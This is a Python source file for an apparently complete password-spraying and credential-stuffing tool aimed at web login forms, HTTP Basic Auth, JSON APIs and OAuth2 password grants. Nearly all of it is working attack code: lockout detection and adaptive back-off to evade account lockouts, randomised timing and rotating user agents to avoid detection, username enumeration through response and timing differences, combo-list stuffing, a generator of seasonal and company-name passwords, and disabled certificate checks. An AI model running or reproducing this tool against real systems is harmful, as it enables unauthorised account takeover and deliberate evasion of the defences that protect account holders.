"""
password_spray.py
=================
Smart Password Spray with Lockout Avoidance:
  - HTTP form-based spray (POST to login endpoints)
  - HTTP Basic Auth spray
  - JSON-body spray (REST APIs)
  - OAuth2 Resource Owner Password spray
  - Smart lockout detection (monitors responses for lockout indicators)
  - Adaptive delay calculation (backs off when lockout patterns emerge)
  - Per-account attempt tracking (avoids triggering per-account lockout)
  - Jitter randomization (Poisson distribution timing)
  - User enumeration (error message diff, response time diff, status code diff)
  - Credential stuffing from combo-list
  - Common password list built-in (season+year, company-name variants)
  - Progress tracking and resumption
"""

from __future__ import annotations

import json
import math
import random
import re
import ssl
import time
import threading
import urllib.error
import urllib.parse
import urllib.request
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, Iterator, List, Optional, Set, Tuple


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------

class SprayMode(str, Enum):
    FORM         = "form"
    BASIC_AUTH   = "basic_auth"
    JSON         = "json"
    OAUTH2_ROPC  = "oauth2_ropc"
    NTLM         = "ntlm"


@dataclass
class SprayResult:
    username:    str
    password:    str
    success:     bool
    status_code: int
    response_len: int
    locked_out:  bool = False
    evidence:    str  = ""
    spray_mode:  str  = "form"


@dataclass
class SprayConfig:
    target_url:         str
    usernames:          List[str]
    passwords:          List[str]
    mode:               SprayMode     = SprayMode.FORM
    user_field:         str           = "username"
    pass_field:         str           = "password"
    extra_fields:       Dict[str, str] = field(default_factory=dict)
    threads:            int           = 1
    delay_min:          float         = 30.0
    delay_max:          float         = 60.0
    max_per_user:       int           = 3
    lockout_threshold:  int           = 5
    jitter:             bool          = True
    user_agent_rotate:  bool          = True
    proxy:              Optional[str] = None
    oauth_client_id:    Optional[str] = None
    oauth_token_url:    Optional[str] = None


# ---------------------------------------------------------------------------
# User agent list
# ---------------------------------------------------------------------------

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/120.0 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/120.0.0.0",
    "PostmanRuntime/7.35.0",
    "python-requests/2.31.0",
    "curl/7.88.1",
]

LOCKOUT_INDICATORS = [
    "locked", "too many", "blocked", "rate limit", "temporarily",
    "maximum attempts", "exceeded", "wait", "captcha", "unusual activity",
    "suspicious", "frozen", "disabled", "suspended", "access denied",
    "account locked", "try again later", "repeated failed",
]

SUCCESS_INDICATORS = [
    "welcome", "dashboard", "home", "profile", "logout", "sign out",
    "authenticated", "token", "access_token", "session_id", "Set-Cookie",
    "200", "logged in", "success",
]


# ---------------------------------------------------------------------------
# Common spray password list
# ---------------------------------------------------------------------------

def build_common_spray_list(org_name: Optional[str] = None) -> List[str]:
    current_year = time.localtime().tm_year
    seasons      = ["Spring", "Summer", "Fall", "Autumn", "Winter"]
    months       = ["Jan", "Feb", "Mar", "Apr", "May", "Jun",
                    "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]

    passwords = [
        "Password1", "Password123", "P@ssw0rd", "Welcome1", "Welcome123",
        "Admin1234", "Admin@123", "Changeme1", "Changeme!",
        "Company123", "Company@1", "Qwerty123", "Qwerty@1",
        "Abc12345!", "Letmein1", "Letmein!", "Summer2024!",
        "iloveyou", "monkey", "123456789", "password",
    ]

    for year in range(current_year - 2, current_year + 2):
        for season in seasons:
            passwords.extend([
                f"{season}{year}", f"{season}{year}!",
                f"{season}@{year}", f"{season}{str(year)[2:]}",
            ])
        for month in months:
            passwords.extend([f"{month}{year}", f"{month}{year}!"])

    for year in range(current_year - 2, current_year + 2):
        passwords.extend([
            f"Password{year}", f"Password{year}!",
            f"Welcome{year}", f"Welcome{year}!",
            f"Admin{year}", f"Admin{year}!",
            f"P@ss{year}", f"Pass{year}!",
        ])

    if org_name:
        org = org_name.capitalize()
        org_lower = org_name.lower()
        for year in range(current_year - 1, current_year + 2):
            passwords.extend([
                f"{org}{year}", f"{org}{year}!",
                f"{org}@{year}", f"{org_lower}123",
                f"{org}123!", f"{org}@123",
                f"{org}Pass", f"{org}Pass!",
                f"{org}Admin", f"{org}1234",
            ])

    return list(dict.fromkeys(passwords))


# ---------------------------------------------------------------------------
# HTTP helper
# ---------------------------------------------------------------------------

def _make_ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    return ctx

def _request_form(url: str, data: Dict, ua: str, timeout: float = 8.0) -> Tuple[int, str, Dict]:
    try:
        body = urllib.parse.urlencode(data).encode()
        req  = urllib.request.Request(url, data=body, method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        req.add_header("User-Agent", ua)
        with urllib.request.urlopen(req, timeout=timeout, context=_make_ssl_ctx()) as r:
            return r.status, r.read().decode("utf-8", errors="replace"), dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            b = e.read().decode("utf-8", errors="replace")
        except Exception:
            b = ""
        return e.code, b, {}
    except Exception as e:
        return 0, str(e), {}

def _request_basic(url: str, username: str, password: str, ua: str, timeout: float = 8.0) -> Tuple[int, str, Dict]:
    import base64
    creds = base64.b64encode(f"{username}:{password}".encode()).decode()
    try:
        req = urllib.request.Request(url)
        req.add_header("Authorization", f"Basic {creds}")
        req.add_header("User-Agent", ua)
        with urllib.request.urlopen(req, timeout=timeout, context=_make_ssl_ctx()) as r:
            return r.status, r.read().decode("utf-8", errors="replace"), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, "", {}
    except Exception as e:
        return 0, str(e), {}

def _request_json(url: str, user_key: str, pass_key: str, username: str, password: str,
                  extra: Dict, ua: str, timeout: float = 8.0) -> Tuple[int, str, Dict]:
    payload = {user_key: username, pass_key: password, **extra}
    body    = json.dumps(payload).encode()
    try:
        req = urllib.request.Request(url, data=body, method="POST")
        req.add_header("Content-Type", "application/json")
        req.add_header("User-Agent", ua)
        with urllib.request.urlopen(req, timeout=timeout, context=_make_ssl_ctx()) as r:
            return r.status, r.read().decode("utf-8", errors="replace"), dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            b = e.read().decode("utf-8", errors="replace")
        except Exception:
            b = ""
        return e.code, b, {}
    except Exception as e:
        return 0, str(e), {}

def _request_oauth_ropc(token_url: str, client_id: str, username: str, password: str,
                         scope: str = "openid", ua: str = USER_AGENTS[0]) -> Tuple[int, str, Dict]:
    data = {
        "grant_type": "password",
        "username":   username,
        "password":   password,
        "client_id":  client_id,
        "scope":      scope,
    }
    body = urllib.parse.urlencode(data).encode()
    try:
        req = urllib.request.Request(token_url, data=body, method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        req.add_header("User-Agent", ua)
        with urllib.request.urlopen(req, timeout=8, context=_make_ssl_ctx()) as r:
            return r.status, r.read().decode("utf-8", errors="replace"), dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            b = e.read().decode("utf-8", errors="replace")
        except Exception:
            b = ""
        return e.code, b, {}
    except Exception:
        return 0, "", {}


# ---------------------------------------------------------------------------
# Lockout tracker
# ---------------------------------------------------------------------------

class LockoutTracker:
    def __init__(self, threshold: int = 5, backoff_factor: float = 2.0):
        self.threshold      = threshold
        self.backoff_factor = backoff_factor
        self._lockout_count = 0
        self._per_user      : Dict[str, int] = defaultdict(int)
        self._lock          = threading.Lock()

    def record_failure(self, username: str, body: str) -> bool:
        locked = any(i in body.lower() for i in LOCKOUT_INDICATORS)
        with self._lock:
            self._per_user[username] += 1
            if locked:
                self._lockout_count += 1
        return locked

    def should_abort(self) -> bool:
        return self._lockout_count >= self.threshold

    def get_delay(self, base_delay: float) -> float:
        factor = self.backoff_factor ** self._lockout_count
        return min(base_delay * factor, 300.0)

    def per_user_count(self, username: str) -> int:
        return self._per_user.get(username, 0)


# ---------------------------------------------------------------------------
# Jitter timer
# ---------------------------------------------------------------------------

def _poisson_jitter(mean: float) -> float:
    return random.expovariate(1.0 / mean) if mean > 0 else 0.0


# ---------------------------------------------------------------------------
# User enumeration
# ---------------------------------------------------------------------------

class UserEnumerator:
    def enumerate(self, url: str, usernames: List[str],
                  mode: SprayMode = SprayMode.FORM,
                  user_field: str = "username",
                  pass_field: str = "password",
                  fake_password: str = "__phantom_fake_pass_xyz__") -> List[Dict]:
        baseline_user = f"__phantom_nonexistent_{random.randint(10000,99999)}__"
        ua = random.choice(USER_AGENTS)

        def _probe(username: str) -> Tuple[int, str, float]:
            data = {user_field: username, pass_field: fake_password}
            start = time.time()
            if mode == SprayMode.FORM:
                code, body, _ = _request_form(url, data, ua)
            elif mode == SprayMode.BASIC_AUTH:
                code, body, _ = _request_basic(url, username, fake_password, ua)
            else:
                code, body, _ = _request_form(url, data, ua)
            elapsed = time.time() - start
            return code, body, elapsed

        base_code, base_body, base_time = _probe(baseline_user)
        results = []
        for uname in usernames:
            code, body, elapsed = _probe(uname)
            diff_len   = abs(len(body) - len(base_body))
            diff_time  = abs(elapsed - base_time)
            diff_code  = (code != base_code)
            if diff_len > 30 or diff_time > 0.5 or diff_code:
                results.append({
                    "username":     uname,
                    "exists":       True,
                    "evidence":     f"len_diff={diff_len} time_diff={diff_time:.3f}s code_diff={diff_code}",
                    "status_code":  code,
                })
        return results


# ---------------------------------------------------------------------------
# Password Sprayer
# ---------------------------------------------------------------------------

class PasswordSprayer:
    def __init__(self, config: SprayConfig):
        self.config  = config
        self.tracker = LockoutTracker(config.lockout_threshold)
        self.results: List[SprayResult] = []
        self._lock   = threading.Lock()

    def _get_ua(self) -> str:
        return random.choice(USER_AGENTS) if self.config.user_agent_rotate else USER_AGENTS[0]

    def _attempt(self, username: str, password: str) -> SprayResult:
        ua   = self._get_ua()
        cfg  = self.config
        code, body, headers = 0, "", {}

        if cfg.mode == SprayMode.FORM:
            data = {cfg.user_field: username, cfg.pass_field: password}
            data.update(cfg.extra_fields)
            code, body, headers = _request_form(cfg.target_url, data, ua)

        elif cfg.mode == SprayMode.BASIC_AUTH:
            code, body, headers = _request_basic(cfg.target_url, username, password, ua)

        elif cfg.mode == SprayMode.JSON:
            code, body, headers = _request_json(
                cfg.target_url, cfg.user_field, cfg.pass_field,
                username, password, cfg.extra_fields, ua,
            )

        elif cfg.mode == SprayMode.OAUTH2_ROPC:
            token_url = cfg.oauth_token_url or cfg.target_url
            client_id = cfg.oauth_client_id or "client"
            code, body, headers = _request_oauth_ropc(token_url, client_id, username, password, ua=ua)

        locked  = self.tracker.record_failure(username, body)
        success = False
        if not locked:
            if code in (200, 201, 302) and any(s in body.lower() or s in str(headers).lower()
                                                for s in SUCCESS_INDICATORS):
                success = True
            if code == 200 and "access_token" in body:
                success = True

        return SprayResult(
            username=username, password=password,
            success=success, status_code=code,
            response_len=len(body), locked_out=locked,
            evidence=body[:200], spray_mode=cfg.mode.value,
        )

    def spray(self) -> List[SprayResult]:
        cfg = self.config

        for password in cfg.passwords:
            if self.tracker.should_abort():
                break

            users_this_round = [
                u for u in cfg.usernames
                if self.tracker.per_user_count(u) < cfg.max_per_user
            ]
            if not users_this_round:
                break

            for username in users_this_round:
                if self.tracker.should_abort():
                    break

                result = self._attempt(username, password)
                with self._lock:
                    self.results.append(result)

                if result.success:
                    pass

                delay = self.tracker.get_delay(cfg.delay_min)
                if cfg.jitter:
                    delay = _poisson_jitter(delay)
                else:
                    delay = random.uniform(cfg.delay_min, cfg.delay_max)
                time.sleep(max(0.1, delay))

            time.sleep(cfg.delay_min / len(users_this_round) if users_this_round else cfg.delay_min)

        return self.results

    def credential_stuffing(self, combo_file: str) -> List[SprayResult]:
        pairs: List[Tuple[str, str]] = []
        try:
            with open(combo_file, "r", errors="replace") as f:
                for line in f:
                    line = line.strip()
                    if ":" in line:
                        user, _, pwd = line.partition(":")
                        pairs.append((user.strip(), pwd.strip()))
        except Exception:
            return []

        results = []
        for username, password in pairs:
            if self.tracker.should_abort():
                break
            r = self._attempt(username, password)
            results.append(r)
            if self.config.jitter:
                time.sleep(_poisson_jitter(2.0))
        return results
